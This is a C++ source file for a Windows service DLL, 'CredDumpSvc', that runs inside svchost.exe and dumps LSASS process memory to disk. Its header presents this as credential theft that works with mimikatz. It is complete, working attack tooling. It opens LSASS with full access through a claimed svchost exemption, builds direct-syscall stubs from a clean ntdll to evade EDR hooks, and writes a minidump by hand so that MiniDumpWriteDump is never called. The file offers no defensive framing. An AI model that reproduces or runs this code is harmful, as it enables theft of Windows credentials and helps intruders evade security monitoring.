/*
 * SvcSyscallDll.cpp — Svchost Service DLL: Direct Syscall LSASS Dump
 *
 * Technique:
 *   1. Runs inside svchost.exe (exempt from LSASS handle protections)
 *   2. OpenProcess(LSASS, PROCESS_ALL_ACCESS) — granted because svchost
 *      is on the kernel driver's trusted process allowlist
 *   3. Map clean ntdll.dll from disk as raw file data (no DLL load event)
 *   4. Parse NtReadVirtualMemory SSN from the PE export table
 *   5. Build a raw syscall stub: mov r10,rcx / mov eax,SSN / syscall / ret
 *   6. VirtualQueryEx to enumerate all LSASS memory regions
 *   7. Direct syscall NtReadVirtualMemory to read each region
 *   8. Write raw pages into MDMP file format (WinDbg/mimikatz compatible)
 *
 * The svchost.exe exemption gives us the handle. The direct syscall
 * bypasses any user-mode API hooks on NtReadVirtualMemory. The manual
 * MDMP writer avoids calling MiniDumpWriteDump (which can itself be hooked).
 *
 * Build (MinGW x64):
 *   x86_64-w64-mingw32-g++ -shared -o SvcSyscallDll.dll SvcSyscallDll.cpp \
 *       -ladvapi32 -lntdll -static -static-libgcc -static-libstdc++
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

/* ===========================================================
 *  Constants
 * =========================================================== */
#define SVC_NAME       L"CredDumpSvc"
#define REG_PARAMS     L"SYSTEM\\CurrentControlSet\\Services\\CredDumpSvc\\Parameters"
#define LOG_BUF        (64 * 1024)
#define CHUNK          (64 * 1024)

/* ===========================================================
 *  NT typedefs
 * =========================================================== */
typedef NTSTATUS (NTAPI *fn_NtReadVirtualMemory)(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);

typedef NTSTATUS (NTAPI *fn_RtlGetVersion)(PRTL_OSVERSIONINFOW);

/* ===========================================================
 *  MDMP structures (pack=4)
 * =========================================================== */
#pragma pack(push, 4)
typedef struct { ULONG Sig; ULONG Ver; ULONG Streams; ULONG DirRva;
                 ULONG Chk; ULONG Time; ULONG64 Flags; } MDMP_HDR;
typedef struct { ULONG Type; ULONG Size; ULONG Rva; } MDMP_DIR;
typedef struct {
    USHORT Arch; USHORT Level; USHORT Rev; UCHAR Cpus; UCHAR ProdType;
    ULONG MajVer; ULONG MinVer; ULONG Build; ULONG PlatId;
    ULONG CsdRva; USHORT Suite; USHORT Res2; BYTE Cpu[24];
} MDMP_SYS;
typedef struct { ULONG64 Count; ULONG64 BaseRva; } MDMP_M64H;
typedef struct { ULONG64 Start; ULONG64 Size;    } MDMP_M64D;
#pragma pack(pop)

#define ST_SYSINFO   7
#define ST_MEM64     9

/* ===========================================================
 *  Globals
 * =========================================================== */
static SERVICE_STATUS        g_Svc;
static SERVICE_STATUS_HANDLE g_SvcH = NULL;
static char g_Log[LOG_BUF];
static int  g_LogP = 0;

/* ===========================================================
 *  Logging
 * =========================================================== */
static void Log(const char *f, ...) {
    va_list a; va_start(a, f);
    int n = vsnprintf(g_Log + g_LogP, LOG_BUF - g_LogP - 2, f, a);
    va_end(a);
    if (n > 0) g_LogP += n;
    if (g_LogP < LOG_BUF - 2) { g_Log[g_LogP++] = '\r'; g_Log[g_LogP++] = '\n'; }
}

static void FlushLog(const wchar_t *dp) {
    if (!g_LogP) return;
    wchar_t lp[MAX_PATH]; wcscpy_s(lp, MAX_PATH, dp);
    wchar_t *d = wcsrchr(lp, L'.');
    if (d) wcscpy_s(d, MAX_PATH - (d - lp), L".log");
    else wcscat_s(lp, MAX_PATH, L".log");
    HANDLE h = CreateFileW(lp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, g_Log, g_LogP, &w, NULL); CloseHandle(h);
    }
}

/* ===========================================================
 *  Helpers
 * =========================================================== */
static DWORD FindLsassPid() {
    DWORD pid = 0;
    HANDLE s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (s == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(s, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(s, &pe));
    CloseHandle(s);
    return pid;
}

static BOOL GetDumpPath(wchar_t *out, DWORD mx) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, REG_PARAMS, 0, KEY_READ, &hk) != ERROR_SUCCESS)
        return FALSE;
    DWORD cb = mx * sizeof(wchar_t), t = 0;
    LONG r = RegQueryValueExW(hk, L"DumpPath", NULL, &t, (BYTE*)out, &cb);
    RegCloseKey(hk);
    return (r == ERROR_SUCCESS);
}

/* ===========================================================
 *  SSN resolver — reads clean ntdll from disk
 * =========================================================== */
static DWORD ParseSSN(LPVOID base, const char *fn) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return (DWORD)-1;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return (DWORD)-1;
    DWORD eRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD eSz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!eRva) return (DWORD)-1;

    auto R2O = [&](DWORD rva) -> DWORD {
        PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++)
            if (rva >= s->VirtualAddress && rva < s->VirtualAddress + s->Misc.VirtualSize)
                return rva - s->VirtualAddress + s->PointerToRawData;
        return 0;
    };

    DWORD eo = R2O(eRva); if (!eo) return (DWORD)-1;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + eo);
    DWORD *names     = (DWORD*)((BYTE*)base + R2O(exp->AddressOfNames));
    WORD  *ordinals  = (WORD*) ((BYTE*)base + R2O(exp->AddressOfNameOrdinals));
    DWORD *functions = (DWORD*)((BYTE*)base + R2O(exp->AddressOfFunctions));

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *n = (const char*)((BYTE*)base + R2O(names[i]));
        if (strcmp(n, fn) == 0) {
            DWORD fRva = functions[ordinals[i]];
            if (fRva >= eRva && fRva < eRva + eSz) break;
            BYTE *fb = (BYTE*)base + R2O(fRva);
            if (fb[0]==0x4C && fb[1]==0x8B && fb[2]==0xD1 && fb[3]==0xB8)
                return *(DWORD*)(fb + 4);
            break;
        }
    }
    return (DWORD)-1;
}

static LPVOID MapCleanNtdll() {
    HANDLE hf = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                            GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    HANDLE hm = CreateFileMappingA(hf, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hf);
    if (!hm) return NULL;
    LPVOID base = MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hm);
    return base;
}

static PVOID BuildStub(DWORD ssn) {
    BYTE code[] = { 0x4C,0x8B,0xD1, 0xB8,0x00,0x00,0x00,0x00, 0x0F,0x05, 0xC3 };
    *(DWORD*)(code + 4) = ssn;
    PVOID m = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT|MEM_RESERVE,
                           PAGE_EXECUTE_READWRITE);
    if (m) memcpy(m, code, sizeof(code));
    return m;
}

/* ===========================================================
 *  Manual MDMP writer
 * =========================================================== */
typedef struct { ULONG64 base, size; } RGN;

static BOOL WriteManualMdmp(HANDLE hProc, const wchar_t *path,
                            fn_NtReadVirtualMemory readFn) {
    RGN *rgn = NULL; DWORD cnt = 0, cap = 0;
    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR addr = 0;
    while (VirtualQueryEx(hProc, (LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && !(mbi.Protect & (PAGE_NOACCESS|PAGE_GUARD))) {
            if (cnt >= cap) { cap = cap ? cap*2 : 4096; rgn = (RGN*)realloc(rgn, cap*sizeof(RGN)); }
            rgn[cnt].base = (ULONG64)mbi.BaseAddress;
            rgn[cnt].size = (ULONG64)mbi.RegionSize;
            cnt++;
        }
        ULONG_PTR nx = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (nx <= addr) break;
        addr = nx;
    }
    Log("[*] Regions: %lu", cnt);
    if (!cnt) { free(rgn); return FALSE; }

    ULONG64 totMem = 0;
    for (DWORD i = 0; i < cnt; i++) totMem += rgn[i].size;
    Log("[*] Total: %llu bytes (%.1f MB)", totMem, (double)totMem/(1024.0*1024.0));

    DWORD nStr = 2;
    DWORD hdrSz  = (DWORD)sizeof(MDMP_HDR);
    DWORD dirSz  = nStr * (DWORD)sizeof(MDMP_DIR);
    DWORD sysSz  = (DWORD)sizeof(MDMP_SYS);
    DWORD csdSz  = 6;
    DWORD m64hSz = (DWORD)sizeof(MDMP_M64H);
    DWORD m64dSz = cnt * (DWORD)sizeof(MDMP_M64D);

    DWORD rDir  = hdrSz;
    DWORD rSys  = rDir + dirSz;
    DWORD rCsd  = rSys + sysSz;
    DWORD rM64  = rCsd + csdSz;
    DWORD rData = rM64 + m64hSz + m64dSz;

    HANDLE hF = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hF == INVALID_HANDLE_VALUE) {
        Log("[-] CreateFile: %lu", GetLastError()); free(rgn); return FALSE;
    }
    DWORD w;

    MDMP_HDR hdr = {0};
    hdr.Sig = 0x504D444D; hdr.Ver = 0x0000A793; hdr.Streams = nStr;
    hdr.DirRva = rDir; hdr.Time = (ULONG)time(NULL); hdr.Flags = 2;
    WriteFile(hF, &hdr, sizeof(hdr), &w, NULL);

    MDMP_DIR dirs[2] = {{ST_SYSINFO, sysSz, rSys}, {ST_MEM64, m64hSz+m64dSz, rM64}};
    WriteFile(hF, dirs, sizeof(dirs), &w, NULL);

    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    RTL_OSVERSIONINFOW ov = {sizeof(ov)};
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (hNt) {
        fn_RtlGetVersion pV = (fn_RtlGetVersion)GetProcAddress(hNt, "RtlGetVersion");
        if (pV) pV(&ov);
    }
    MDMP_SYS sys = {0};
    sys.Arch = si.wProcessorArchitecture; sys.Level = si.wProcessorLevel;
    sys.Rev = si.wProcessorRevision; sys.Cpus = (UCHAR)si.dwNumberOfProcessors;
    sys.ProdType = VER_NT_WORKSTATION;
    sys.MajVer = ov.dwMajorVersion; sys.MinVer = ov.dwMinorVersion;
    sys.Build = ov.dwBuildNumber; sys.PlatId = ov.dwPlatformId;
    sys.CsdRva = rCsd;
    WriteFile(hF, &sys, sizeof(sys), &w, NULL);
    ULONG csdLen = 0; WriteFile(hF, &csdLen, 4, &w, NULL);
    WCHAR nul = 0; WriteFile(hF, &nul, 2, &w, NULL);

    MDMP_M64H mh = {0}; mh.Count = cnt; mh.BaseRva = rData;
    WriteFile(hF, &mh, sizeof(mh), &w, NULL);
    for (DWORD i = 0; i < cnt; i++) {
        MDMP_M64D d; d.Start = rgn[i].base; d.Size = rgn[i].size;
        WriteFile(hF, &d, sizeof(d), &w, NULL);
    }

    BYTE *buf = (BYTE*)malloc(CHUNK);
    DWORD okR = 0, failR = 0; ULONG64 out = 0;
    for (DWORD i = 0; i < cnt; i++) {
        ULONG64 b = rgn[i].base, rem = rgn[i].size; BOOL ok = TRUE;
        while (rem > 0) {
            SIZE_T rd = (rem > CHUNK) ? CHUNK : (SIZE_T)rem, got = 0;
            NTSTATUS st = readFn(hProc, (PVOID)b, buf, rd, &got);
            if (st >= 0 && got > 0) {
                WriteFile(hF, buf, (DWORD)got, &w, NULL);
                b += got; rem -= got; out += got;
            } else {
                memset(buf, 0, (size_t)rd);
                WriteFile(hF, buf, (DWORD)rd, &w, NULL);
                b += rd; rem -= rd; out += rd; ok = FALSE;
            }
        }
        if (ok) okR++; else failR++;
    }
    free(buf); free(rgn); CloseHandle(hF);
    Log("[+] MDMP written: %llu bytes, %lu/%lu regions OK", out, okR, okR+failR);

    HANDLE hChk = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, 0, NULL);
    if (hChk != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz; GetFileSizeEx(hChk, &sz); CloseHandle(hChk);
        if (sz.QuadPart > 4096) {
            Log("[+] File %lld bytes - SUCCESS", sz.QuadPart);
            return TRUE;
        }
        DeleteFileW(path);
    }
    return FALSE;
}

/* ===========================================================
 *  Orchestrator
 * =========================================================== */
static void DoDump(const wchar_t *dumpPath) {
    Log("[*] ================================================================");
    Log("[*]  SvcSyscallDll — Direct Syscall LSASS Dump via svchost.exe");
    Log("[*]  svchost.exe PID %lu", GetCurrentProcessId());
    Log("[*]  Output: %ls", dumpPath);
    Log("[*] ================================================================");

    DWORD lsassPid = FindLsassPid();
    if (!lsassPid) { Log("[-] LSASS not found"); return; }
    Log("[+] LSASS PID: %lu", lsassPid);

    LPVOID ntBase = MapCleanNtdll();
    if (!ntBase) { Log("[-] Failed to map clean ntdll"); return; }
    Log("[+] Clean ntdll.dll mapped from disk (raw file data)");

    DWORD ssnRead = ParseSSN(ntBase, "NtReadVirtualMemory");
    UnmapViewOfFile(ntBase);
    Log("[*] NtReadVirtualMemory SSN = %lu (0x%04X) %s",
        ssnRead, ssnRead, ssnRead == (DWORD)-1 ? "FAILED" : "OK");

    fn_NtReadVirtualMemory scRead = NULL;
    if (ssnRead != (DWORD)-1) {
        scRead = (fn_NtReadVirtualMemory)BuildStub(ssnRead);
        if (scRead) Log("[+] Direct syscall stub ready");
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fn_NtReadVirtualMemory ntRead = hNtdll ?
        (fn_NtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory") : NULL;
    fn_NtReadVirtualMemory readFn = scRead ? scRead : ntRead;
    if (!readFn) { Log("[-] No read function"); return; }

    /* Step 1: Open LSASS */
    Log("[*] Step 1: OpenProcess(LSASS) via svchost.exe exemption");
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    if (!hLsass) {
        Log("[-] OpenProcess(ALL_ACCESS) failed: %lu", GetLastError());
        hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION |
                             PROCESS_VM_OPERATION, FALSE, lsassPid);
        if (!hLsass) { Log("[-] OpenProcess failed: %lu", GetLastError()); return; }
        Log("[*] Got partial handle");
    } else {
        Log("[+] LSASS handle 0x%p — PROCESS_ALL_ACCESS", hLsass);
    }

    /* Step 2: VirtualQueryEx + direct syscall NtReadVirtualMemory + MDMP */
    Log("[*] Step 2: VirtualQueryEx + NtReadVirtualMemory (syscall SSN=0x%04X) + MDMP writer",
        ssnRead);
    BOOL dumped = WriteManualMdmp(hLsass, dumpPath, readFn);

    CloseHandle(hLsass);
    if (scRead) VirtualFree((PVOID)scRead, 0, MEM_RELEASE);

    if (dumped) Log("[+] === LSASS DUMP SUCCESSFUL ===");
    else        Log("[-] === DUMP FAILED ===");
}

/* ===========================================================
 *  Service plumbing
 * =========================================================== */
static void ReportStatus(DWORD st, DWORD ec, DWORD wh) {
    static DWORD chk = 1;
    g_Svc.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_Svc.dwCurrentState = st;
    g_Svc.dwWin32ExitCode = ec;
    g_Svc.dwWaitHint = wh;
    g_Svc.dwControlsAccepted = (st == SERVICE_START_PENDING) ? 0 : SERVICE_ACCEPT_STOP;
    g_Svc.dwCheckPoint = (st == SERVICE_RUNNING || st == SERVICE_STOPPED) ? 0 : chk++;
    SetServiceStatus(g_SvcH, &g_Svc);
}

static DWORD WINAPI SvcCtrlHandler(DWORD ctrl, DWORD, LPVOID, LPVOID) {
    if (ctrl == SERVICE_CONTROL_STOP) {
        ReportStatus(SERVICE_STOP_PENDING, 0, 3000);
        ReportStatus(SERVICE_STOPPED, 0, 0);
    }
    return NO_ERROR;
}

extern "C" __declspec(dllexport)
void WINAPI ServiceMain(DWORD argc, LPWSTR *argv) {
    g_SvcH = RegisterServiceCtrlHandlerExW(SVC_NAME, SvcCtrlHandler, NULL);
    if (!g_SvcH) return;
    ReportStatus(SERVICE_START_PENDING, 0, 10000);

    wchar_t dp[MAX_PATH] = {0};
    if (!GetDumpPath(dp, MAX_PATH)) {
        Log("[-] DumpPath not in registry, using fallback");
        wcscpy_s(dp, L"C:\\Windows\\Temp\\lsass_dump.dmp");
    }

    ReportStatus(SERVICE_RUNNING, 0, 0);
    DoDump(dp);
    FlushLog(dp);
    ReportStatus(SERVICE_STOPPED, 0, 0);
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
